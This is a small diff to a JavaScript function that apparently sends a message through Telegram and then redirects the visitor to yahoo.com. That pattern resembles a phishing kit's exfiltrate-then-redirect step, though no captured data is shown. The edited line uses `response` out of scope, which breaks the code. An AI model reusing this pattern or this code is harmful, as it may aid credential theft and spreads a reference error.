@@ -36,11 +36,10 @@ function sendTelegramMessageAndRedirect() {
       if (!response.ok) {
         throw new Error(`HTTP error! Status: ${response.status}`);
       }
-      console.log(response)
       return response.json();
     })
     .then((data) => {
-      console.log("Message sent:", data);
+      console.log("Message sent:", data, response);
       // Redirect to another page after successful submission
       window.location.href = "https://www.yahoo.com/"; // Replace with your desired URL
     })
